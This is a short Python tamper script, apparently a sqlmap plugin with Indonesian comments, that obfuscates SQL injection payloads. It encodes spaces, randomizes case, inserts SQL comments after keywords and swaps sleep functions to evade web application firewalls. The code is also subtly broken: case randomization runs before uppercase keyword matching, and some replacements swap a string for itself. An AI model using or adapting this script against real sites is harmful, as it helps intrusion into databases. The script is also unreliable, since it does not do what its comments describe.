from lib.core.enums import PRIORITY
import random

__priority__ = PRIORITY.LOW

def tamper(payload, **kwargs):
    if not payload:
        return payload

    # Ganti spasi dengan %20
    payload = payload.replace(" ", "%20")

    # Acak case huruf pada payload
    def random_case(s):
        return ''.join(c.upper() if random.choice([True, False]) else c.lower() for c in s)

    payload = random_case(payload)

    # Sisipkan komentar SQL acak di beberapa tempat
    comments = ["/*+*/", "/*comment*/", "/*xyz*/"]
    for comment in comments:
        if comment not in payload:
            # Sisipkan komentar setelah kata kunci or, and, select, sleep, dll
            payload = payload.replace("OR", "OR" + comment)
            payload = payload.replace("AND", "AND" + comment)
            payload = payload.replace("SELECT", "SELECT" + comment)
            payload = payload.replace("SLEEP", "SLEEP" + comment)
            payload = payload.replace("BENCHMARK", "BENCHMARK" + comment)
            payload = payload.replace("WAITFOR", "WAITFOR" + comment)

    # Ganti fungsi sleep dengan varian lain (pg_sleep, sleep, WAITFOR DELAY)
    payload = payload.replace("SLEEP", "pg_sleep")
    payload = payload.replace("WAITFOR%20DELAY", "WAITFOR%20DELAY")

    # Sisipkan delay dengan format berbeda jika ada sleep
    if "pg_sleep" in payload:
        payload = payload.replace("pg_sleep", "pg_sleep")

    return payload
